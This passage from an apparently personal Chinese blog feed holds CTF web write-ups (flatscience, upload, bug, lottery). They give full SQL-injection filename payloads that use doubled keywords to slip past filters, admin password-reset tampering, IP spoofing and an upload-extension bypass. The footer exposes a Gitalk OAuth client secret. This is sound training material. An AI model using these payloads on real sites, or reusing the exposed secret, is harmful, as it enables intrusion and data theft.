url.split(&#39;&#x2F;&#39;)[-1]</span><br><span class="line">    u &#x3D; urllib.request.urlopen(url)</span><br><span class="line">    f &#x3D; open(file_name, &#39;wb&#39;)</span><br><span class="line"></span><br><span class="line">    block_sz &#x3D; 8192</span><br><span class="line">    while True:</span><br><span class="line">        buffer &#x3D; u.read(block_sz)</span><br><span class="line">        if not buffer:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        f.write(buffer)</span><br><span class="line">    f.close()</span><br><span class="line">    print (&quot;Sucessful to download&quot; + &quot; &quot; + file_name)</span><br><span class="line"></span><br><span class="line">#指定网页</span><br><span class="line">root_url &#x3D; [&#39;http:&#x2F;&#x2F;111.198.29.45:54344&#x2F;1&#x2F;2&#x2F;5&#x2F;&#39;,</span><br><span class="line">            &#39;http:&#x2F;&#x2F;111.198.29.45:54344&#x2F;&#39;]</span><br><span class="line"></span><br><span class="line">raw_url &#x3D; [&#39;http:&#x2F;&#x2F;111.198.29.45:54344&#x2F;1&#x2F;2&#x2F;5&#x2F;index.html&#39;,</span><br><span class="line">            &#39;http:&#x2F;&#x2F;111.198.29.45:54344&#x2F;index.html&#39;</span><br><span class="line">           ]</span><br><span class="line">#指定目录</span><br><span class="line">os.mkdir(&#39;ldf_download&#39;)</span><br><span class="line">os.chdir(os.path.join(os.getcwd(), &#39;ldf_download&#39;))</span><br><span class="line">for i in range(len(root_url)):</span><br><span class="line">    print(&quot;当前网页：&quot;,root_url[i])</span><br><span class="line">    html &#x3D; getHtml(raw_url[i])</span><br><span class="line">    url_lst &#x3D; getUrl(html)</span><br><span class="line"></span><br><span class="line">    for url in url_lst[:]:</span><br><span class="line">        url &#x3D; root_url[i] + url</span><br><span class="line">        getFile(url)</span><br></pre></td></tr></table></figure></div>
</details>
<br>
 9_3.对爬取到的PDF，我们进行密码sha1对比,仍然使用py3编写的，因为是到处参考改编，到后面已经没办法给出一个完整的参考对象了，但是经个人测试，可以在py3上完美运行，如果报错，确实模块，下载对应模块即可。

<p><img src="5.PNG" alt=""></p>
<details>
<summary>python3识别PDF内容并进行密码对冲     展开/折叠</summary>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">from io import StringIO</span><br><span class="line"></span><br><span class="line">#python3</span><br><span class="line">from pdfminer.pdfpage import PDFPage</span><br><span class="line">from pdfminer.converter import TextConverter</span><br><span class="line">from pdfminer.converter import PDFPageAggregator</span><br><span class="line">from pdfminer.layout import LTTextBoxHorizontal, LAParams</span><br><span class="line">from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import string</span><br><span class="line">import os</span><br><span class="line">import hashlib</span><br><span class="line">import importlib</span><br><span class="line">import random</span><br><span class="line">from urllib.request import urlopen</span><br><span class="line">from urllib.request import Request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_pdf():</span><br><span class="line">	return [i for i in os.listdir(&quot;.&#x2F;ldf_download&#x2F;&quot;) if i.endswith(&quot;pdf&quot;)]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def convert_pdf_to_txt(path_to_file):</span><br><span class="line">    rsrcmgr &#x3D; PDFResourceManager()</span><br><span class="line">    retstr &#x3D; StringIO()</span><br><span class="line">    codec &#x3D; &#39;utf-8&#39;</span><br><span class="line">    laparams &#x3D; LAParams()</span><br><span class="line">    device &#x3D; TextConverter(rsrcmgr, retstr, codec&#x3D;codec, laparams&#x3D;laparams)</span><br><span class="line">    fp &#x3D; open(path_to_file, &#39;rb&#39;)</span><br><span class="line">    interpreter &#x3D; PDFPageInterpreter(rsrcmgr, device)</span><br><span class="line">    password &#x3D; &quot;&quot;</span><br><span class="line">    maxpages &#x3D; 0</span><br><span class="line">    caching &#x3D; True</span><br><span class="line">    pagenos&#x3D;set()</span><br><span class="line"></span><br><span class="line">    for page in PDFPage.get_pages(fp, pagenos, maxpages&#x3D;maxpages, password&#x3D;password,caching&#x3D;caching, check_extractable&#x3D;True):</span><br><span class="line">        interpreter.process_page(page)</span><br><span class="line"></span><br><span class="line">    text &#x3D; retstr.getvalue()</span><br><span class="line"></span><br><span class="line">    fp.close()</span><br><span class="line">    device.close()</span><br><span class="line">    retstr.close()</span><br><span class="line">    return text</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def find_password():</span><br><span class="line">	pdf_path &#x3D; get_pdf()</span><br><span class="line">	for i in pdf_path:</span><br><span class="line">		print (&quot;Searching word in &quot; + i)</span><br><span class="line">		pdf_text &#x3D; convert_pdf_to_txt(&quot;.&#x2F;ldf_download&#x2F;&quot;+i).split(&quot; &quot;)</span><br><span class="line">		for word in pdf_text:</span><br><span class="line">			sha1_password &#x3D; hashlib.sha1(word.encode(&#39;utf-8&#39;)+&#39;Salz!&#39;.encode(&#39;utf-8&#39;)).hexdigest()</span><br><span class="line">			if (sha1_password &#x3D;&#x3D; &#39;3fab54a50e770d830c0416df817567662a9dc85c&#39;):</span><br><span class="line">				print (&quot;Find the password :&quot; + word)</span><br><span class="line">				exit()</span><br><span class="line">			</span><br><span class="line"> </span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	find_password()</span><br></pre></td></tr></table></figure></div>
</details>

<br>
<div class="note info"><p>0x03 参考</p></div>
1.<a href="https://www.runoob.com/sqlite/sqlite-create-database.html" target="_blank">1.SQLite操作，菜鸟官网：https://www.runoob.com/sqlite/sqlite-create-database.html </a><br>
2.<a href="https://blog.csdn.net/weixin_45425482/article/details/103556670" target="_blank">ctf-flatscience：https://blog.csdn.net/weixin_45425482/article/details/103556670 </a><br>
3.<a href='https://github.com/pdfminer/pdfminer.six' target="_blank">兼容py2+3的pdf模块（可能有用）</a><br>







<br>
<br>

<!-- Link Gitalk 的支持文件  -->
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script> 
<div id="gitalk-container"></div>     <script type="text/javascript">
    var gitalk = new Gitalk({

<pre><code>// gitalk的主要参数
    clientID: &apos;dcf239aa6b46fcf244a3&apos;,
    clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;,
    repo: &apos;MR-eggegg.github.io&apos;,
    owner: &apos;MR-eggegg&apos;,
    admin: [&apos;MR-eggegg&apos;],
    id: &apos;页面的唯一标识，gitalk会根据这个标识自动创建的issue的标签&apos;,

});
gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
]]></content>
      
        <categories>
            
            <category> CTF-WEB </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> sha1解密 </tag>
            
            <tag> python 爬取网页PDF文件 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF攻防世界-WEB-upload]]></title>
      <url>/2019/12/29/ctf-web-upload/</url>
      <content type="html"><![CDATA[<div class="note info"><p>0x01 前要</p></div>
1.SQL注入


<a id="more"></a>
<br>
<div class="note info"><p>0x02 解题流程与思路</p></div>
1.注册账号，登陆后发现让你上传文件，大概还是小马文件上传拿shell那一套的感觉。
 1_1.直接上传php，txt文件都会报错，想体验一下的，可以利用Burp Suite的Intruder功能测试，可上传文件类型，最后发现是jpg。
![](1.PNG)

<p>2.通过Burp Suite修改后缀名成功上传文件后发现，根本没法利用菜刀查询数据库。<br> 2_2.但是每次上传成功后，在页面中会显示上传的文件名。也就是说明文件确实被上传到了数据库中。</p>
<p><img src="2.PNG" alt=""></p>
<p>3.尝试SQL注入，select database().jpg,页面显示的文件名为database().jpg，意味着select被服务器过滤了。<br> 3_1.正常的注入不行，尝试双写或者闭合注入。可以发现当注入selselectect可以成功绕过注入。</p>
<p><img src="3.PNG" alt=""></p>
<p> 3_2.猜测数据库插入语法为<br>    INSERT INTO table_name (‘filename’,’…..’)<br>    VALUES (‘upload_filename’);</p>
<p> 3_3.修改注入,上传成功后发现页面返回的文件名为0，SQL语句确实被上传了，但是却无法输出结果<br> <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selselectect database())+'</span>.jpg</span><br></pre></td></tr></table></figure></div><br> 3_4.看了wp之后，尝试将输出改为16进制。页面返回值为 7765625。实际上有写过python hex转码的会发现返回值为7位数，会直接报错。猜测是否有一部分数值被服务器截断了。实际上是碰巧猜到了截断，如果有正好偶数对返回值存在的情况下，可以看参考里的博主是怎么推测的。</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selselectect hex(database()))+'</span>.jpg</span><br></pre></td></tr></table></figure></div>
<p> 3_5.尝试其他进制,CONV(N,原进制,目标进制)<br>    (1)尝试十进制，页面返回值为1.8446744073709552e19，返回值过大。<br> ‘+(selselectect conv(hex(database()),16,10))+’.jpg<br> <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;</span><br><span class="line">	(2)用substr做长度限制。substr(str,pos,len)  str字符串，从pos开始的位置，截取len个字符(空白也算字符)。</span><br><span class="line">	用二分法测试返回值长度上限，发现当长度为12时，返回值为正常，当长度超过12时候，返回值表现为幂级</span><br><span class="line"> &#96;&#96;&#96;bash</span><br><span class="line"> &#39;+(selselectect conv(substr(hex(database()),1,12),16,10))+ &#39;.jpg</span><br></pre></td></tr></table></figure></div><br>  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selselectect conv(substr(hex(database()),13,12),16,10))+ '</span>.jpg</span><br></pre></td></tr></table></figure></div><br><br><br>    (3)将返回值先转化为16进制，再进行hex转码，分别得出结果 web_up和load，得出数据库名为 web_upload</p>
<br>

<p> 3_6.继续猜测表名<br>    (1)进行表名注入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selselectect+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema='</span>web_upload<span class="string">' limit 1,1)),1,12),16,10))+'</span>.jpg</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selselectect+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema='</span>web_upload<span class="string">' limit 1,1)),13,12),16,10))+'</span>.jpg</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selselectect+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema='</span>web_upload<span class="string">' limit 1,1)),25,12),16,10))+'</span>.jpg</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selselectect+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema='</span>web_upload<span class="string">' limit 1,1)),37,12),16,10))+'</span>.jpg</span><br></pre></td></tr></table></figure></div>
<br>
    (2)拼接得出表名 hello_flag_is_here

<br>

<p>3_7.继续查询列名<br>    (1)进行表注入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selselectect CONV(substr(hex((selecselectt group_concat(column_name) frofromm information_schema.columns where table_name='</span>hello_flag_is_here<span class="string">')),1,12),16,10))+'</span>.jpg</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selselectect CONV(substr(hex((selecselectt group_concat(column_name) frofromm information_schema.columns where table_name='</span>hello_flag_is_here<span class="string">')),13,12),16,10))+'</span>.jpg</span><br></pre></td></tr></table></figure></div>
<br>
    (2)转为十六进制后hex解码 拼接得出结果 i_am_flag

<p>3_8.继续查询字段<br>    (1)字段注入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selselectect+CONV(substr(hex((seselectlect i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+'</span>.jpg</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selselectect+CONV(substr(hex((seselectlect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+'</span>.jpg</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selselectect+CONV(substr(hex((seselectlect i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+'</span>.jpg</span><br></pre></td></tr></table></figure></div>
<br>
    (2)拼接得出结果  !!_@m_Th.e_F!lag

<p>4.结果可以说非常坑，不需要加XCTF，flag之类的前缀，得出的就是解题结果</p>
<div class="note info"><p>0x03 参考</p></div>
1.<a href="https://www.runoob.com/sql/sql-insert.html" target="_blank">1.SQL操作，菜鸟官网：https://www.runoob.com/sql/sql-insert.html</a><br>
2.<a href="https://www.lagou.com/lgeduarticle/38458.html" target="_blank">ctf-web进阶：https://www.lagou.com/lgeduarticle/38458.html</a><br>








<br>
<br>

<!-- Link Gitalk 的支持文件  -->
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script> 
<div id="gitalk-container"></div>     <script type="text/javascript">
    var gitalk = new Gitalk({

<pre><code>// gitalk的主要参数
    clientID: &apos;dcf239aa6b46fcf244a3&apos;,
    clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;,
    repo: &apos;MR-eggegg.github.io&apos;,
    owner: &apos;MR-eggegg&apos;,
    admin: [&apos;MR-eggegg&apos;],
    id: &apos;页面的唯一标识，gitalk会根据这个标识自动创建的issue的标签&apos;,

});
gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
]]></content>
      
        <categories>
            
            <category> CTF-WEB </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF攻防世界-WEB-bug]]></title>
      <url>/2019/12/28/ctf-web-bug/</url>
      <content type="html"><![CDATA[<div class="note info"><p>0x01 前要</p></div>
1.文件上传绕过<br>
2.apache的文件解析漏洞

<a id="more"></a>
<br>
<div class="note info"><p>0x02 解题流程与思路</p></div>
1.看到登陆界面，尝试sql注入，无果。

<br>

<p>2.按流程注册账号，登陆，登陆成功，但显示只有admin用户才允许使用特权</p>
<p><img src="1.PNG" alt=""></p>
<p>3.已知用户为admin，考虑到是不是要用字典爆破密码。但是看到wp里，可以通过修改密码时，通过修改传参，修改admin的密码。</p>
<p><img src="2.PNG" alt=""></p>
<p>4.显示IP not allowed发现仍然登陆失败，抓包查看请求IP。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">请求网址:http://111.198.29.45:34163/index.php?module=admin</span><br><span class="line">请求方法:GET</span><br><span class="line">远程地址:127.0.0.1:8080</span><br></pre></td></tr></table></figure></div>
<p>4_1.修改IP 为127.0.0.1，成功登陆，并找到线索</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- index.php?module=filemanage&amp;<span class="keyword">do</span>=???--&gt;</span><br></pre></td></tr></table></figure></div>
<p>5.根据线索，已知是文件管理模型，猜测do为增删查改，尝试write，download,read,upload。最后确认为upload。</p>
<p><img src="3.PNG" alt=""></p>
<p>6.尝试上传文件，提示只能上传图片文件，最初猜测是一句话木马，后来发现更简单粗暴。。。<br>新建txt文件 写入下面代码，然后改后缀名为image文件，然后上传文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">'php'</span>&gt;随便写不影响解题&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>
<p>6_1.依旧抓包，改参数，将后缀名改为php5，即可获得flag<br><img src="4.PNG" alt=""></p>
<div class="note info"><p>0x03 参考</p></div>
1.<a href="https://blog.csdn.net/harry_c/article/details/100631696" target="_blank">l攻防世界WEB进阶之bug</a><br>
2.<a href="https://blog.csdn.net/wn314/article/details/77074477" target="_blank">关于为什么最后一步无法使用php.xxx只能改参php4/5</a><br>








<br>
<br>

<!-- Link Gitalk 的支持文件  -->
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script> 
<div id="gitalk-container"></div>     <script type="text/javascript">
    var gitalk = new Gitalk({

<pre><code>// gitalk的主要参数
    clientID: &apos;dcf239aa6b46fcf244a3&apos;,
    clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;,
    repo: &apos;MR-eggegg.github.io&apos;,
    owner: &apos;MR-eggegg&apos;,
    admin: [&apos;MR-eggegg&apos;],
    id: &apos;页面的唯一标识，gitalk会根据这个标识自动创建的issue的标签&apos;,

});
gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
]]></content>
      
        <categories>
            
            <category> CTF-WEB </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 修改传参 </tag>
            
            <tag> 文件上传绕过 </tag>
            
            <tag> 伪造ip </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF攻防世界-WEB-lottery]]></title>
      <url>/2019/12/27/ctf-lottery/</url>
      <content type="html"><![CDATA[<div class="note info"><p>0x01 前要</p></div>
1.目录遍历-git源码泄露<br>
2.robots协议<br>
3.PHP 弱类型比较

<a id="more"></a>


<div class="note info"><p>0x02 解题流程与思路</p></div>
1.尝试测试网页，注册账号，购买彩票，攒足足够的钱，购买flag。<br>
1_1.尝试购买彩票，利用浏览器工具抓包，发现购买彩票时，数据通过api.php。

<p><img src="1.PNG" alt=""></p>
<p>2.尝试获取api.php源码，在CTF新手区时，其实我们做过类似的题目，robots协议，尝试查看robots.txt。可知网页存在.git源码泄露。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /.git/</span><br></pre></td></tr></table></figure></div>
<br>

<p>3.下载githack，遍历网页目录并下载<br>3_1.<a href="https://github.com/tigert1998/GitHack-py3" target="_blank">下载github-python3</a></p>
<p><img src="2.PNG" alt=""></p>
<p>4.文件存在我们需要的api.php，查看api.php代码，进行代码审计。</p>
<details>
<summary>api.php代码     展开/折叠</summary>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once(&#39;config.php&#39;);</span><br><span class="line">header(&#39;Content-Type: application&#x2F;json&#39;);</span><br><span class="line"></span><br><span class="line">function response($resp)&#123;</span><br><span class="line">	die(json_encode($resp));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function response_error($msg)&#123;</span><br><span class="line">	$result &#x3D; [&#39;status&#39;&#x3D;&gt;&#39;error&#39;];</span><br><span class="line">	$result[&#39;msg&#39;] &#x3D; $msg;</span><br><span class="line">	response($result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function require_keys($req, $keys)&#123;</span><br><span class="line">	foreach ($keys as $key) &#123;</span><br><span class="line">		if(!array_key_exists($key, $req))&#123;</span><br><span class="line">			response_error(&#39;invalid request&#39;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function require_registered()&#123;</span><br><span class="line">	if(!isset($_SESSION[&#39;name&#39;]) || !isset($_SESSION[&#39;money&#39;]))&#123;</span><br><span class="line">		response_error(&#39;register first&#39;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function require_min_money($min_money)&#123;</span><br><span class="line">	if(!isset($_SESSION[&#39;money&#39;]))&#123;</span><br><span class="line">		response_error(&#39;register first&#39;);</span><br><span class="line">	&#125;</span><br><span class="line">	$money &#x3D; $_SESSION[&#39;money&#39;];</span><br><span class="line">	if($money &lt; 0)&#123;</span><br><span class="line">		$_SESSION &#x3D; array();</span><br><span class="line">		session_destroy();</span><br><span class="line">		response_error(&#39;invalid negative money&#39;);</span><br><span class="line">	&#125;</span><br><span class="line">	if($money &lt; $min_money)&#123;</span><br><span class="line">		response_error(&#39;you don\&#39; have enough money&#39;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_SERVER[&quot;REQUEST_METHOD&quot;] !&#x3D; &#39;POST&#39; || !isset($_SERVER[&quot;CONTENT_TYPE&quot;]) || $_SERVER[&quot;CONTENT_TYPE&quot;] !&#x3D; &#39;application&#x2F;json&#39;)&#123;</span><br><span class="line">	response_error(&#39;please post json data&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data &#x3D; json_decode(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;), true);</span><br><span class="line">if(json_last_error() !&#x3D; JSON_ERROR_NONE)&#123;</span><br><span class="line">	response_error(&#39;invalid json&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">require_keys($data, [&#39;action&#39;]);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; my boss told me to use cryptographically secure algorithm </span><br><span class="line">function random_num()&#123;</span><br><span class="line">	do &#123;</span><br><span class="line">		$byte &#x3D; openssl_random_pseudo_bytes(10, $cstrong);</span><br><span class="line">		$num &#x3D; ord($byte);</span><br><span class="line">	&#125; while ($num &gt;&#x3D; 